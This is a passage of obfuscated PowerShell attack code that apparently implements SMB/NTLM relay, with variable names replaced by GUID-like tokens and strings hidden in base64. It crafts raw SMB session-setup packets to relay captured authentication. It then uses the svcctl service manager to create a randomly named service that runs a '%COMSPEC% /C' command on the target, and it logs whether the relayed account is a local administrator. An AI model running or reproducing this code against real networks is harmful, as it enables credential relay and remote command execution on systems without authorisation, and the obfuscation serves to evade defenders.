                    ${7f26f613b1c741f1a2beceeccb6d3ceb} = ${7f26f613b1c741f1a2beceeccb6d3ceb} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
                    ${7f26f613b1c741f1a2beceeccb6d3ceb} = ${7f26f613b1c741f1a2beceeccb6d3ceb}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
                    ${809c789c0fa94b0a84323999a0eb6d45} = [BitConverter]::ToString([BitConverter]::GetBytes(${a9193eb32e9d4059a8ee112591b4c284}.length + 45))
                    ${809c789c0fa94b0a84323999a0eb6d45} = ${809c789c0fa94b0a84323999a0eb6d45} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
                    ${809c789c0fa94b0a84323999a0eb6d45} = ${809c789c0fa94b0a84323999a0eb6d45}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
                    ${5428e2be79734d188e441711d67c30ad} = [BitConverter]::ToString([BitConverter]::GetBytes(${a9193eb32e9d4059a8ee112591b4c284}.length + 104))
                    ${5428e2be79734d188e441711d67c30ad} = ${5428e2be79734d188e441711d67c30ad} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
                    ${5428e2be79734d188e441711d67c30ad} = ${5428e2be79734d188e441711d67c30ad}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
                    [array]::Reverse(${5428e2be79734d188e441711d67c30ad})
                    [Byte[]] $SMB_relay_challenge_send = (0x00,0x00)`
                        + ${5428e2be79734d188e441711d67c30ad}`
                        + (0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + ${14770f41645f456d8f09e703674e2364}.process_ID_bytes`
                        + (0x00,0x00,0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                        + ${7f26f613b1c741f1a2beceeccb6d3ceb}`
                        + (0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80)`
                        + ${809c789c0fa94b0a84323999a0eb6d45}`
                        + (0x60)`
                        + ${b78a212c1f7a4231aadd452e02ae358c}`
                        + (0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0)`
                        + ${6ef85f0986c4451082b56ed39a4d568c}`
                        + (0x30,0x3c,0xa0,0x0e,0x30,0x0c,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,0xa2)`
                        + ${2b7dffccef024dbdb39395b9fa2b6cfe}`
                        + (0x04)`
                        + ${a0d47ed2fd90469ca67886d5df77d3c5}`
                        + ${a9193eb32e9d4059a8ee112591b4c284}`
                        + (0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00)
                }
            }
            ${85245ee5fd1543e7bc94b3ee8b7ee6ca}.Write($SMB_relay_challenge_send, 0, $SMB_relay_challenge_send.length)
            ${85245ee5fd1543e7bc94b3ee8b7ee6ca}.Flush()
            if(${ce8aca9715a04e2c9f2a44b1b8fdfadd})
            {
                ${acce8bb9742d4e5296bf8a8efe9d5db9} = new-timespan -Seconds ${ce8aca9715a04e2c9f2a44b1b8fdfadd}
                ${aae4de86af78492ebde26d1ca608e6ce} = [diagnostics.stopwatch]::StartNew()
                while(!${85245ee5fd1543e7bc94b3ee8b7ee6ca}.DataAvailable)
                {
                    if(${aae4de86af78492ebde26d1ca608e6ce}.elapsed -ge ${acce8bb9742d4e5296bf8a8efe9d5db9})
                    {
                        ${14770f41645f456d8f09e703674e2364}.console_queue.add("SMB relay target didn't respond within ${ce8aca9715a04e2c9f2a44b1b8fdfadd} seconds")
                        ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within ${ce8aca9715a04e2c9f2a44b1b8fdfadd} seconds")])
                        ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 0
                        ${b5a410ab8b3741c7aa10b8c950fa2b93}.Close()
                        break SMB_relay_challenge_loop
                    }
                }
            }
            ${85245ee5fd1543e7bc94b3ee8b7ee6ca}.Read(${b14be03d0cb9490c9f9b45e438745f33}, 0, ${b14be03d0cb9490c9f9b45e438745f33}.length)
            ${a10417d5e3184252837bf6f5a7df4ee3}++
        }
        return ${b14be03d0cb9490c9f9b45e438745f33}
    }
}
${8df219cda85a437db1261227037d7cfb} =
{
    Function SMBRelayResponse
    {
        param (${b5a410ab8b3741c7aa10b8c950fa2b93},${a9193eb32e9d4059a8ee112591b4c284},${aae1d8c26b7d46bc9af9c61caec0e833})
        ${c1783ab0bc034c059c9a9d1d584078f2} = New-Object System.Byte[] 1024
        if (${b5a410ab8b3741c7aa10b8c950fa2b93})
        {
            ${026826a8f0034186bf97dd72a737e637} = ${b5a410ab8b3741c7aa10b8c950fa2b93}.GetStream()
        }
        ${b78a212c1f7a4231aadd452e02ae358c} = [BitConverter]::ToString([BitConverter]::GetBytes(${a9193eb32e9d4059a8ee112591b4c284}.length + 12))
        ${b78a212c1f7a4231aadd452e02ae358c} = ${b78a212c1f7a4231aadd452e02ae358c} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${b78a212c1f7a4231aadd452e02ae358c} = ${b78a212c1f7a4231aadd452e02ae358c}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${6ef85f0986c4451082b56ed39a4d568c} = [BitConverter]::ToString([BitConverter]::GetBytes(${a9193eb32e9d4059a8ee112591b4c284}.length + 8))
        ${6ef85f0986c4451082b56ed39a4d568c} = ${6ef85f0986c4451082b56ed39a4d568c} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${6ef85f0986c4451082b56ed39a4d568c} = ${6ef85f0986c4451082b56ed39a4d568c}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${2b7dffccef024dbdb39395b9fa2b6cfe} = [BitConverter]::ToString([BitConverter]::GetBytes(${a9193eb32e9d4059a8ee112591b4c284}.length + 4))
        ${2b7dffccef024dbdb39395b9fa2b6cfe} = ${2b7dffccef024dbdb39395b9fa2b6cfe} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${2b7dffccef024dbdb39395b9fa2b6cfe} = ${2b7dffccef024dbdb39395b9fa2b6cfe}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${a0d47ed2fd90469ca67886d5df77d3c5} = [BitConverter]::ToString([BitConverter]::GetBytes(${a9193eb32e9d4059a8ee112591b4c284}.length))
        ${a0d47ed2fd90469ca67886d5df77d3c5} = ${a0d47ed2fd90469ca67886d5df77d3c5} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${a0d47ed2fd90469ca67886d5df77d3c5} = ${a0d47ed2fd90469ca67886d5df77d3c5}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${7f26f613b1c741f1a2beceeccb6d3ceb} = [BitConverter]::ToString([BitConverter]::GetBytes(${a9193eb32e9d4059a8ee112591b4c284}.length + 16))
        ${7f26f613b1c741f1a2beceeccb6d3ceb} = ${7f26f613b1c741f1a2beceeccb6d3ceb} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${7f26f613b1c741f1a2beceeccb6d3ceb} = ${7f26f613b1c741f1a2beceeccb6d3ceb}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${809c789c0fa94b0a84323999a0eb6d45} = [BitConverter]::ToString([BitConverter]::GetBytes(${a9193eb32e9d4059a8ee112591b4c284}.length + 27))
        ${809c789c0fa94b0a84323999a0eb6d45} = ${809c789c0fa94b0a84323999a0eb6d45} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${809c789c0fa94b0a84323999a0eb6d45} = ${809c789c0fa94b0a84323999a0eb6d45}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${5428e2be79734d188e441711d67c30ad} = [BitConverter]::ToString([BitConverter]::GetBytes(${a9193eb32e9d4059a8ee112591b4c284}.length + 86))
        ${5428e2be79734d188e441711d67c30ad} = ${5428e2be79734d188e441711d67c30ad} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${5428e2be79734d188e441711d67c30ad} = ${5428e2be79734d188e441711d67c30ad}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        [array]::Reverse(${b78a212c1f7a4231aadd452e02ae358c})
        [array]::Reverse(${6ef85f0986c4451082b56ed39a4d568c})
        [array]::Reverse(${2b7dffccef024dbdb39395b9fa2b6cfe})
        [array]::Reverse(${a0d47ed2fd90469ca67886d5df77d3c5})
        [array]::Reverse(${5428e2be79734d188e441711d67c30ad})
        ${be439b27ae6a444c9b0c102a1d8d85f0} = 0
        :SMB_relay_response_loop while (${be439b27ae6a444c9b0c102a1d8d85f0} -lt 1)
        {
            [Byte[]] $SMB_relay_response_send = (0x00,0x00)`
                + ${5428e2be79734d188e441711d67c30ad}`
                + (0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                + ${14770f41645f456d8f09e703674e2364}.process_ID_bytes`
                + ${aae1d8c26b7d46bc9af9c61caec0e833}`
                + (0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                + ${7f26f613b1c741f1a2beceeccb6d3ceb}`
                + (0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80)`
                + ${809c789c0fa94b0a84323999a0eb6d45}`
                + (0xa1,0x82)`
                + ${b78a212c1f7a4231aadd452e02ae358c}`
                + (0x30,0x82)`
                + ${6ef85f0986c4451082b56ed39a4d568c}`
                + (0xa2,0x82)`
                + ${2b7dffccef024dbdb39395b9fa2b6cfe}`
                + (0x04,0x82)`
                + ${a0d47ed2fd90469ca67886d5df77d3c5}`
                + ${a9193eb32e9d4059a8ee112591b4c284}`
                + (0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00)
            ${026826a8f0034186bf97dd72a737e637}.write($SMB_relay_response_send, 0, $SMB_relay_response_send.length)
        	${026826a8f0034186bf97dd72a737e637}.Flush()
            if(${ce8aca9715a04e2c9f2a44b1b8fdfadd})
            {
                ${c2cce528d11e4f68b8a00f9520ed2551} = new-timespan -Seconds ${ce8aca9715a04e2c9f2a44b1b8fdfadd}
                ${e200a13d2b82439daadc2a89a308cf6a} = [diagnostics.stopwatch]::StartNew()
                while(!${026826a8f0034186bf97dd72a737e637}.DataAvailable)
                {
                    if(${e200a13d2b82439daadc2a89a308cf6a}.elapsed -ge ${c2cce528d11e4f68b8a00f9520ed2551})
                    {
                        ${14770f41645f456d8f09e703674e2364}.console_queue.add("SMB relay target didn't respond within ${ce8aca9715a04e2c9f2a44b1b8fdfadd} seconds")
                        ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within ${ce8aca9715a04e2c9f2a44b1b8fdfadd} seconds")])
                        ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 0
                        ${b5a410ab8b3741c7aa10b8c950fa2b93}.Close()
                        break :SMB_relay_response_loop
                    }
                }
            }
            ${026826a8f0034186bf97dd72a737e637}.Read(${c1783ab0bc034c059c9a9d1d584078f2}, 0, ${c1783ab0bc034c059c9a9d1d584078f2}.length)
            ${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 2
            ${be439b27ae6a444c9b0c102a1d8d85f0}++
        }
        return ${c1783ab0bc034c059c9a9d1d584078f2}
    }
}
${cc6435638a5d465d8ca47df73dad78f6} =
{
    Function SMBRelayExecute
    {
        param (${b5a410ab8b3741c7aa10b8c950fa2b93},${aae1d8c26b7d46bc9af9c61caec0e833})
        if (${b5a410ab8b3741c7aa10b8c950fa2b93})
        {
            ${22a737d7b0454dbdb8d47d986d7f18e1} = ${b5a410ab8b3741c7aa10b8c950fa2b93}.GetStream()
        }
        ${7a0331efccb749c69c6920e567d0dc13} = $false
        ${087382ec6553412fb4b98d05f9a0b479} = New-Object System.Byte[] 1024
        ${d94693254153470da088870012dd575a} = [String]::Join($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0A'))), (1..20 | %{$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0ALQA='))) -f (Get-Random -Minimum 65 -Maximum 90)}))
        ${f7022c50cc454c62a266db26663db12a} = ${d94693254153470da088870012dd575a} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
        ${f7022c50cc454c62a266db26663db12a} = ${f7022c50cc454c62a266db26663db12a}.Substring(0,${f7022c50cc454c62a266db26663db12a}.Length-1)
        ${f7022c50cc454c62a266db26663db12a} = ${f7022c50cc454c62a266db26663db12a}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${f7022c50cc454c62a266db26663db12a} = New-Object System.String (${f7022c50cc454c62a266db26663db12a},0,${f7022c50cc454c62a266db26663db12a}.Length)
        ${d94693254153470da088870012dd575a} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAA==')))
        [Byte[]]$SMB_service_bytes = ${d94693254153470da088870012dd575a}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${2f3af2cd1b30486caf73256db67dddbf} = [String](1..4 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
        ${2f3af2cd1b30486caf73256db67dddbf} = ${2f3af2cd1b30486caf73256db67dddbf}.Split(" ") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${a9b4a2ed80da4358b66ed01c153ac674} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBDAE8ATQBTAFAARQBDACUAIAAvAEMAIAAiAA=='))) + ${a9b4a2ed80da4358b66ed01c153ac674} + "`""
        [System.Text.Encoding]::UTF8.GetBytes(${a9b4a2ed80da4358b66ed01c153ac674}) | %{ $SMB_relay_command += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0ALQAwADAALQA='))) -f $_ }
        if([bool](${a9b4a2ed80da4358b66ed01c153ac674}.length%2))
        {
            $SMB_relay_command += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAA==')))
        }
        else
        {
            $SMB_relay_command += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))
        }    
        [Byte[]]$SMB_relay_command_bytes = $SMB_relay_command.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${0b7c228e023e4e46af0ce08099840488} = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237)
        ${0b7c228e023e4e46af0ce08099840488} = ${0b7c228e023e4e46af0ce08099840488}[2..0]
        ${c8b74d486ca0471bb6fc737d0905995a} = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237 - 63)
        ${c8b74d486ca0471bb6fc737d0905995a} = ${c8b74d486ca0471bb6fc737d0905995a}[0..1]   
        ${931633b4e4404d09ba94427c2e4f96f2} = [BitConverter]::GetBytes($SMB_relay_command_bytes.length / 2)
        ${12f3b6e71c40427784b9e56ddcaf317b} = 0
        :SMB_relay_execute_loop while (${12f3b6e71c40427784b9e56ddcaf317b} -lt 12)
        {
            switch (${12f3b6e71c40427784b9e56ddcaf317b})
            {
                0 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x45,0xff,0x53,0x4d,0x42,0x75,0x00,0x00,0x00,0x00,0x18,0x01,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + ${14770f41645f456d8f09e703674e2364}.process_ID_bytes`
                        + ${aae1d8c26b7d46bc9af9c61caec0e833}`
                        + (0x00,0x00,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31)`
                        + (0x30,0x2e,0x32,0x2e,0x31,0x30,0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00)
                }
                1 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x5b,0xff,0x53,0x4d,0x42,0xa2,0x00,0x00,0x00,0x00,0x18,0x02,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + ${14770f41645f456d8f09e703674e2364}.process_ID_bytes`
                        + ${aae1d8c26b7d46bc9af9c61caec0e833}`
                        + (0x03,0x00,0x18,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x16,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + (0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,0x00,0x00,0x00)`
                        + (0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00)
                }
                2 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x87,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + ${14770f41645f456d8f09e703674e2364}.process_ID_bytes`
                        + ${aae1d8c26b7d46bc9af9c61caec0e833}`
                        + (0x04,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x48,0x00)`
                        + (0x00,0x00,0x48,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x05,0x00,0x0b,0x03,0x10,0x00,0x00,0x00,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x16,0xd0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                        + (0x01,0x00,0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03,0x02,0x00,0x00)`
                        + (0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,0x00)
                        ${e3219f6c61bc426ba22ed4156ae4b3fb} = (0x05)
                }
                3 { 
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                4 {
                    [Byte[]] $SMB_relay_execute_send = (0x00,0x00,0x00,0x9b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + ${14770f41645f456d8f09e703674e2364}.process_ID_bytes`
                        + ${aae1d8c26b7d46bc9af9c61caec0e833}`
                        + (0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x50)`
                        + (0x00,0x00,0x00,0x5c,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x5c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03)`
                        + (0x00,0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00)
                        ${e3219f6c61bc426ba22ed4156ae4b3fb} = (0x07)
                }
                5 {  
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                6 {
                    [Byte[]]$SMB_relay_execute_send = [ARRAY](0x00)`
                        + ${0b7c228e023e4e46af0ce08099840488}`
                        + (0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + ${14770f41645f456d8f09e703674e2364}.process_ID_bytes`
                        + ${aae1d8c26b7d46bc9af9c61caec0e833}`
                        + (0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00)`
                        + ${c8b74d486ca0471bb6fc737d0905995a}`
                        + (0x00,0x00)`
                        + ${c8b74d486ca0471bb6fc737d0905995a}`
                        + (0x3f,0x00,0x00,0x00,0x00,0x00)`
                        + ${c8b74d486ca0471bb6fc737d0905995a}`
                        + (0x05,0x00,0x00,0x03,0x10)`
                        + (0x00,0x00,0x00)`
                        + ${c8b74d486ca0471bb6fc737d0905995a}`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00)`
                        + ${273a0a40624c430891a3ddcd26f9da84}`
                        + (0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0x00,0x00)`
                        + ${2f3af2cd1b30486caf73256db67dddbf}`
                        + (0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + ${931633b4e4404d09ba94427c2e4f96f2}`
                        + (0x00,0x00,0x00,0x00)`
                        + ${931633b4e4404d09ba94427c2e4f96f2}`
                        + $SMB_relay_command_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                        ${e3219f6c61bc426ba22ed4156ae4b3fb} = (0x09)
                }
                7 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                8 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + ${14770f41645f456d8f09e703674e2364}.process_ID_bytes`
                        + ${aae1d8c26b7d46bc9af9c61caec0e833}`
                        + (0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x34)`
                        + (0x00,0x00,0x00,0x34,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x00,0x00,0x13,0x00)`
                        + ${273a0a40624c430891a3ddcd26f9da84}`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                }
                9 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                10 { 
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + ${14770f41645f456d8f09e703674e2364}.process_ID_bytes`
                        + ${aae1d8c26b7d46bc9af9c61caec0e833}`
                        + (0x0b,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x0b,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x2c)`
                        + (0x00,0x00,0x00,0x2c,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x2c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x00,0x00,0x02,0x00)`
                        + ${273a0a40624c430891a3ddcd26f9da84}
                }
                11 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
            }
            ${22a737d7b0454dbdb8d47d986d7f18e1}.write($SMB_relay_execute_send, 0, $SMB_relay_execute_send.length)
            ${22a737d7b0454dbdb8d47d986d7f18e1}.Flush()
            if(${ce8aca9715a04e2c9f2a44b1b8fdfadd})
            {
                ${d2fc13ef15ce44e785bddc976f6701dc} = new-timespan -Seconds ${ce8aca9715a04e2c9f2a44b1b8fdfadd}
                ${2deb662fcec64aef8f8c6ef0bb6daec7} = [diagnostics.stopwatch]::StartNew()
                while(!${22a737d7b0454dbdb8d47d986d7f18e1}.DataAvailable)
                {
                    if(${2deb662fcec64aef8f8c6ef0bb6daec7}.elapsed -ge ${d2fc13ef15ce44e785bddc976f6701dc})
                    {
                        ${14770f41645f456d8f09e703674e2364}.console_queue.add("SMB relay target didn't respond within ${ce8aca9715a04e2c9f2a44b1b8fdfadd} seconds")
                        ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within ${ce8aca9715a04e2c9f2a44b1b8fdfadd} seconds")])
                        ${7a0331efccb749c69c6920e567d0dc13} = $true
                        break SMB_relay_execute_loop
                    }
                }
            }
            if (${12f3b6e71c40427784b9e56ddcaf317b} -eq 5) 
            {
                ${22a737d7b0454dbdb8d47d986d7f18e1}.Read(${087382ec6553412fb4b98d05f9a0b479}, 0, ${087382ec6553412fb4b98d05f9a0b479}.length)
                ${273a0a40624c430891a3ddcd26f9da84} = ${087382ec6553412fb4b98d05f9a0b479}[88..107]
                if(([System.BitConverter]::ToString(${087382ec6553412fb4b98d05f9a0b479}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))) -and ([System.BitConverter]::ToString(${273a0a40624c430891a3ddcd26f9da84}) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))))
                {
                    ${14770f41645f456d8f09e703674e2364}.console_queue.add("${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} is a local administrator on ${b4c7b8b4490e41f88e9083ddb989ee62}")
                    ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} is a local administrator on ${b4c7b8b4490e41f88e9083ddb989ee62}")])
                }
                elseif([System.BitConverter]::ToString(${087382ec6553412fb4b98d05f9a0b479}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                {
                    ${14770f41645f456d8f09e703674e2364}.console_queue.add("${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} is not a local administrator on ${b4c7b8b4490e41f88e9083ddb989ee62}")
                    ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - ${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} is not a local administrator on ${b4c7b8b4490e41f88e9083ddb989ee62}")])
                    ${14770f41645f456d8f09e703674e2364}.SMBRelay_failed_list += "${9d2dc77d4f7d46a9881c1c09bb4e502c}\${5402a5b7196e48efb96da3fc6772459a} ${b4c7b8b4490e41f88e9083ddb989ee62}"
                    ${7a0331efccb749c69c6920e567d0dc13} = $true
                }
                else
                {
